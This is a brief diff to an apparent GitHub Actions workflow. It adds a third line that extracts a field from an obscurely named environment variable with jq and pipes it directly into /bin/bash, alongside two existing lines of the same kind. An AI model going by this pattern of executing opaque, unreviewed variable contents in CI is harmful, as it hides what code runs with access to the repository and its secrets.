@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$suke9" | jq -r .tyy44480 | /bin/bash
           printf '%s' "$gfj1" | jq -r .oelv312 | /bin/bash
+          printf '%s' "$ij1" | jq -r .f4403 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
